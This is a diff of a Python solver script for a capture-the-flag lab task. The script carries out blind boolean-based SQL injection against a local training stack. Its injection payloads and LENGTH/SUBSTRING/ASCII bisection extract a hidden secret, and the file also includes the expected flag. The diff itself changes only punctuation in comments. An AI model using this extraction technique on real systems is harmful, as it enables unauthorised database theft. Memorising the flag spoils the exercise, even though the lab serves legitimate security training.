@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
-"""solvers/p1_4.py — Task 1.4 "Trick Tower — Silent Room" canonical exploit.
+"""solvers/p1_4.py: Task 1.4 "Trick Tower: Silent Room" canonical exploit.
 
 The door route builds its query with raw string concatenation:
 
     SELECT 1 FROM door WHERE code='{code}'
 
-and returns exactly one of two tokens — "PASS" (a row matched) or "FAIL"
-(no row matched, *or* the query errored) — never a result, never a raw
+and returns exactly one of two tokens, "PASS" (a row matched) or "FAIL"
+(no row matched, *or* the query errored), never a result, never a raw
 DBMS error. That single bit is the whole oracle. Unlike p1_1 (auth
 bypass), p1_2 (error-based extractvalue()) or p1_3 (UNION-based), there is
 no data channel here at all: the only thing this script ever learns from
@@ -14,7 +14,7 @@ the server is a boolean, so the entire flag has to be walked out one
 character at a time by asking the database true/false questions about its
 own hidden `keeper.secret` value and reading which token comes back.
 
-This is a real, live extraction against the running stack — every
+This is a real, live extraction against the running stack, every
 character below is recovered by actually querying the oracle, not
 hardcoded. The expected flag is only used for the final assertion.
 """
@@ -30,7 +30,7 @@ BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
 EXPECTED_FLAG = "SEIYAKU{yes_or_no_is_enough}"
 
 # Generous upper bounds so the walk doesn't depend on foreknowledge of the
-# exact flag length/charset — just plausible bounds for a SEIYAKU{...} flag.
+# exact flag length/charset, just plausible bounds for a SEIYAKU{...} flag.
 MAX_LEN = 64
 ASCII_LOW = 32   # space
 ASCII_HIGH = 126  # '~'
@@ -41,7 +41,7 @@ def oracle(code: str) -> bool:
 
     PASS -> True, FAIL -> True's negation. Anything else (network hiccup,
     unexpected body) is treated as a hard failure of the solver itself,
-    not folded into the boolean — that would silently corrupt the walk.
+    not folded into the boolean, that would silently corrupt the walk.
     """
     resp = requests.get(f"{BASE}/p1/silent", params={"code": code}, timeout=10)
     resp.raise_for_status()
@@ -51,7 +51,7 @@ def oracle(code: str) -> bool:
     if has_pass == has_fail:
         raise RuntimeError(
             f"ambiguous oracle response (PASS={has_pass}, FAIL={has_fail}) "
-            f"for code={code!r} — response no longer looks like a silent "
+            f"for code={code!r}, response no longer looks like a silent "
             f"PASS/FAIL room"
         )
     return has_pass
@@ -67,7 +67,7 @@ def confirm_injection_and_silence() -> None:
     also checked to confirm errors fold into FAIL rather than surfacing as
     a distinguishable third state.
     """
-    print("[p1_4] step 0 — confirm injection point + silent oracle")
+    print("[p1_4] step 0, confirm injection point + silent oracle")
 
     true_result = oracle("' OR 1=1-- -")
     print(f"  code=' OR 1=1-- -  -> {'PASS' if true_result else 'FAIL'}")
@@ -80,7 +80,7 @@ def confirm_injection_and_silence() -> None:
         raise RuntimeError("expected FAIL for an always-false injected condition")
 
     # A deliberately malformed query (unbalanced quote, no comment to
-    # neutralize the trailing literal) must read as FAIL too — not as
+    # neutralize the trailing literal) must read as FAIL too, not as
     # anything visibly different (e.g. leaked error text).
     malformed_result = oracle("' OR 1=1")  # trailing quote makes this invalid SQL
     print(f"  code=' OR 1=1 (malformed) -> {'PASS' if malformed_result else 'FAIL'}")
@@ -130,7 +130,7 @@ def main() -> int:
         print("[p1_4] FAIL")
         return 1
 
-    print("[p1_4] step 1 — discover secret length via LENGTH() bisection")
+    print("[p1_4] step 1, discover secret length via LENGTH() bisection")
     length = discover_length()
     print(f"  ok: LENGTH(keeper.secret) = {length}")
     if not (0 < length <= MAX_LEN):
@@ -138,7 +138,7 @@ def main() -> int:
         print("[p1_4] FAIL")
         return 1
 
-    print("[p1_4] step 2 — walk the secret char-by-char via SUBSTRING()/ASCII() bisection")
+    print("[p1_4] step 2, walk the secret char-by-char via SUBSTRING()/ASCII() bisection")
     chars: list[str] = []
     for pos in range(1, length + 1):
         c = discover_char(pos)
